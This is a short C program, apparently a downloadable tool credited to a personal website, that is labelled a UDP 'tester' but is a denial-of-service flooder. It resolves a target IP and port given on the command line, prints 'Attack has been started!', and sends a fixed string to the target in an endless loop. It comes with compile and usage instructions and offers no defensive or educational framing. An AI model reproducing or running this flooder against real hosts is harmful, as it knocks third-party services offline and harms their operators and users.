/*
	Compilation		:	gcc AESUDPTester.c -o AESUDPTester
	Utilisation		:	./AESUDPTester {IP} {PORT}
	Example			:	./AESUDPTester 192.168.1.1 80
	Writer			:	www.alierdemsunar.com (contact@alierdemsunar.com)
*/

#define UDP_STRING "level-23"
#define UDP_SIZE 9

#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
#include <string.h>
#include <stdlib.h>

int AESUdpTester(char *, short);

int AESUdpTester(char *target, short port)
{
	struct sockaddr_in udp;
	struct hostent *bbs;
	int initsocket;

	bbs = gethostbyname(target);
	if (bbs==NULL) {
		printf("Unknown destination: %s\n", target);
		exit(0);
	}
	printf("Attack has been started! Target: %s:%d\n", target, port);
	bzero((char*) &udp, sizeof(udp));
	bcopy(bbs->h_addr, (char *) &udp.sin_addr, bbs->h_length);
	udp.sin_family = bbs->h_addrtype;
	udp.sin_port = htons(port);
	initsocket = socket(AF_INET, SOCK_DGRAM, 0);
	connect(initsocket, (struct sockaddr *) &udp, sizeof(udp));
	return initsocket;
}

main(int argc, char **argv)
{
	int i;
	if(argc!=3)
	{
		fprintf(stderr, "Usage: ./AESUDPTester {IP} {PORT}\n", argv[0]);
		exit(0);
	}
	i=AESUdpTester(argv[1], atoi(argv[2]));
	for(;;)
	{
		send(i, UDP_STRING, UDP_SIZE, 0);
	}
}
